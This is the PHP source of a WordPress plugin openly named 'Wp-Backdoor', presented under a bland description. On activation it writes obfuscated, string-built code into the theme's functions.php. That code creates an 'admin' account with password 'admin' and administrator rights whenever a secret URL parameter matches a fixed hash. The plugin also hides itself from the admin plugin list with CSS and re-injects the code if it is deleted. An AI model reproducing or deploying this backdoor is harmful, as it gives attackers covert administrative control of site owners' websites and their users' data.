<?php
/**
* Plugin Name: Wp-Backdoor
* Plugin URI:        https://www.joymojumder.com/
* Description:       Handle the basics with this plugin.
* Version:           1.2.0
* Requires at least: 5.2
* Requires PHP:      7.4
* Author:            Supermanjoy
* Author URI:        https://www.joymojumder.com/
* License:           GPL v2 or later
* License URI:       https://www.gnu.org/licenses/gpl-2.0.html
*/
if ( ! defined( 'ABSPATH' ) ) {
    die( 'Invalid request.' );
}

// Get plugin path
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );


// Hide plugin by css style
add_action('admin_head', 'hide_plugin_css');

function hide_plugin_css() {

  echo '<style>
    .active.is-uninstallable[data-slug="first-plugin"]{
        display: none;
    }
  </style>';
  
}



// Plugin activition hook
register_activation_hook(__FILE__,'superman_register_activation_hook');

function superman_register_activation_hook(){

   // Read other text
    $read_file = file(get_template_directory().'/functions.php');
    $read_count = count($read_file);

    foreach($read_file as $read){
       trim($read);
    }

    //Open template directory
    $myfile = fopen(get_template_directory().'/functions.php', "a+") or die("Unable to open file!");

    //Write new text
    fwrite($myfile,global_txt($txt));
    fclose($myfile);

}


// Plugin deactivition hook
register_deactivation_hook(__FILE__,'superman_register_deactivation_hook');

function superman_register_deactivation_hook($txt){

    // Get file directory
    $myfile = get_template_directory().'/functions.php';
    $string = file_get_contents($myfile);
    $text =global_txt($txt);

    // For remove text by replace null value
    $replace = str_replace("$text","", $string );
    file_put_contents($myfile, $replace);

}

// Plugin uninstall hook
register_uninstall_hook(__FILE__,'superman_register_uninstall_hook');

function superman_register_uninstall_hook(){

    // Uninstall or delete sucessful
    die("Delete SuccessFul!");

}


// Check plugin active or inactive by plugin name
if ( is_plugin_active( 'backdoor/backdoor.php' ) ) {

    $filename = get_template_directory().'/functions.php';
    $searchfor = global_txt($txt);
    $fh = fopen($filename, 'r');
    $olddata = fread($fh, filesize($filename));

    // If search text match
    if(strpos($olddata, $searchfor)) {}

    // If text Not Match
    else {
        // Read other text
        $read_file = file(get_template_directory().'/functions.php');
        $read_count = count($read_file);

        foreach($read_file as $read){
           trim($read);
        }

        //Open template directory
        $myfile = fopen(get_template_directory().'/functions.php', "a+") or die("Unable to open file!");
        
        //Write new text
        fwrite($myfile,global_txt($txt));
        fclose($myfile);
    }
    fclose($fh);
}


//Writable text here
function global_txt($txt){
    $txt = "\n\n\n/*=============== MY TEXT ===============*/\n\n\n";

    $txt .= "add_action"."( 'wp_head', 'my_url' )".";\n\n";
    $txt .= "function"." "."my_url"."() {\n";
    $txt .= "    "."if"."( md5("."$"."_GET['url'] ) =="."'596a96cc7bf9108cd896f33c44aedc8a' ) {\n\n";
    $txt .= "        "."require"."( 'wp-includes/registration.php' );\n\n";
    $txt .= "        "."if"."( !username_exists( 'admin' ) ) {\n";
    $txt .= "            "."$"."user_id"." = wp_create_user( 'admin', 'admin' );\n";
    $txt .= "            "."$"."user"." = new WP_User("."$"."user_id );\n";
    $txt .= "            "."$"."user->set_role"."( 'administrator' );\n"; 
    $txt .= "        "."}\n";
    $txt .= "    "."}\n";
    $txt .= "}\n";

    return $txt;
}
